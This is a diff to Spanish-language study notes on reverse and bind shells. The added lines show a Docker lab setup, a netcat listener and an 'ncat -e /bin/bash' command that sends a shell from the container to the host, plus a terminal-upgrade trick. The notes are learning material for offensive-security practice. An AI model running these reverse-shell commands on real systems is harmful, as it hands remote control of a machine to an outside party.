@@ -9,7 +9,31 @@
 ```bin/bash
 nvim dockerfile
 ```
-
+- Desplegamos la maquina
+```bin/bash
+docker build -t webserver .
+```
+- En segundo plano con una consola virtual y de manera interactiva
+```bin/bash
+docker run -dit -p 80:80 --name myContainer my_image
+```
+- Conseguir una consola interactiva e instalamos ncat
+```bin/bash
+docker exec -it myContainer bash
+apt install ncat
+```
+- Con la herramienta netcat ponernos en escucha
+```bin/bash
+nc -nlvp 443
+```
+- Desde la maquina interactiva en bash ponemos para recibir conexión
+```bin/bash
+ncat -e /bin/bash 172.17.0.1 443
+```
+- Para ver mejor el diseño en pantalla
+```bin/bash
+script /dev/null -c bash
+```
 >**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
 
 ![[Ejemplo de BindShells.png]]
